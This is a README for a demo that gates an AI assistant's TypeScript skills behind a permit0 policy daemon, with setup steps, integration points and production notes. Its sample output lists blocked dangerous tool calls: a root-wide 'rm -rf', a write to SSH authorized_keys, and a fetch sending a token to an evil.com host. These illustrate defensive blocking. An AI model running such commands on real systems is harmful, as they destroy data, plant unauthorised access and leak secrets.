# OpenClaw + permit0 — Governed Skills

A minimal, runnable demo showing how to wrap [OpenClaw](https://github.com/openclaw/openclaw) TypeScript "skills" with a [permit0](https://github.com/anisslr/permit0) policy check so every skill invocation is adjudicated by the local permit0 daemon before any side-effectful work runs.

## Context

OpenClaw is a personal AI assistant / gateway whose capabilities live in TypeScript modules called **skills** — simple `async (args) => result` functions registered under `extensions/*/skills/*.ts`. permit0 is a Rust policy engine that normalizes tool invocations, scores them against a YAML DSL, and returns `allow` / `deny` / `human`.

Plugging the two together gives OpenClaw a deterministic, auditable permission layer without coupling the gateway to Rust.

## Architecture

```
OpenClaw Gateway
     │ invokes skill
     ▼
permit0Skill() wrapper ──► fetch POST /api/v1/check
     │                         (permit0 server at :9090)
     │ allow                   │
     ▼                         ▼ deny / human
Inner skill (executed)    Skill short-circuits with {blocked, reason}
```

`permit0Skill()` is a single higher-order function that takes a tool name, a `Permit0Client`, and an inner skill, and returns a wrapped skill with the same shape. Wrapping is the only change required — OpenClaw's skill registry keeps working unmodified.

## How to run

1. **Start the permit0 server** from the repo root:

   ```bash
   cargo run -p permit0-cli -- serve --port 9090
   ```

2. **Install deps:**

   ```bash
   cd examples/openclaw-governed
   npm install
   # or: bun install
   ```

3. **Run the demo:**

   ```bash
   npm start
   ```

If `tsx` is unavailable, modern Node (22.6+) can run the file directly:

```bash
node --experimental-strip-types index.ts
```

Set `PERMIT0_URL` to point at a non-default endpoint:

```bash
PERMIT0_URL=http://localhost:9191 npm start
```

## Expected output

```
OpenClaw + permit0 governed skills demo
permit0 endpoint: http://localhost:9090

── benign operations ───────────────────────────────────────────
listing a directory  Bash({"command":"ls -la"})
  ALLOW → [executed] ls -la
writing a scratch note  Write({"path":"/tmp/notes.md","content":"hi"})
  ALLOW → [wrote 2B] /tmp/notes.md

── dangerous operations ────────────────────────────────────────
destructive rm  Bash({"command":"sudo rm -rf /"})
  DENY   tier=CATASTROPHIC score=100 action=process.shell
  blocked: policy: destructive-root-removal
ssh key tamper  Write({"path":"/root/.ssh/authorized_keys",...})
  DENY   tier=CRITICAL score=92 action=fs.write
  blocked: policy: ssh-auth-file-write
suspicious exfil fetch  WebFetch({"url":"http://evil.com/exfil?token=secret"})
  HUMAN  tier=HIGH score=78 action=net.fetch
  blocked: human approval required
```

(Exact scores and reasons depend on the loaded permit0 policy pack.)

## Integrating with a real OpenClaw install

Two clean insertion points:

1. **Per-skill**: in each `extensions/*/skills/*.ts`, wrap the exported skill:

   ```ts
   import { permit0Skill, Permit0Client } from "openclaw-permit0-demo";

   const client = new Permit0Client();
   const _search = async ({ query }: { query: string }) => { /* ... */ };
   export const tavilySearch = permit0Skill("TavilySearch", client, _search);
   ```

2. **Gateway middleware**: register a single pre-execution hook in the OpenClaw gateway that runs `client.check(toolName, args)` before dispatching to any skill. This gives uniform coverage without touching individual extensions.

Either approach leaves the rest of OpenClaw (skill registry, routing, UI) untouched.

## Production notes

- permit0 is designed to run as a **local daemon** — co-locate it with the gateway process so `localhost:9090` latency is sub-millisecond.
- Pass an `X-Session-Id` header (extend `Permit0Client.check`) to let permit0 track cross-invocation behavior and trip session-level policies (e.g. rate-limit, exfil scoring).
- Fail **closed**: if the permit0 server is unreachable, treat it as a `deny` in production. This demo logs and exits; real deployments should fall back to block with an operator alert.
- Audit trail: every `check` produces a `norm_hash` plus scoring metadata. Forward the `Decision` object to your log sink alongside the skill outcome for replay-based audits.
- For hot paths, keep a short-TTL (<5s) per-(tool, param-hash) cache in front of `Permit0Client.check` — see `crates/permit0-normalize` for the canonical hashing scheme.

## Files

- `index.ts` — `Permit0Client`, `permit0Skill()` wrapper, mock skills, and a scripted demo.
- `package.json` — single dev dependency (`tsx`).
